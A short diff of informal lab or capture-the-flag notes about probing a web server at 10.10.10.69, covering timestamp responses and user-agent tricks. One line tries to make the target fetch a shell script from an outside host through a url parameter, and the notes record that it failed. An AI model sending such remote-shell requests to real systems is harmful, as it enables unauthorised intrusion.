@@ -14,6 +14,7 @@ note:
 	-->
 	
 	Notes: means everytime /sync* or anything similar too it, the web server will send back timestamp making it appear valid.
+	2018111T10:21.33 time-respond 
   
   http://10.10.10.69/?url=http://10.10.15.142:8000/shell.py
     Note: Nothing happend. 
@@ -21,7 +22,7 @@ note:
     
     
     can the webpage for diractory, knowing the timestap is failur
-    use "real user agent too not get timestamp folled" 
+    use "real user agent too not get timestamp respond" 
     e.g | Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
     
     
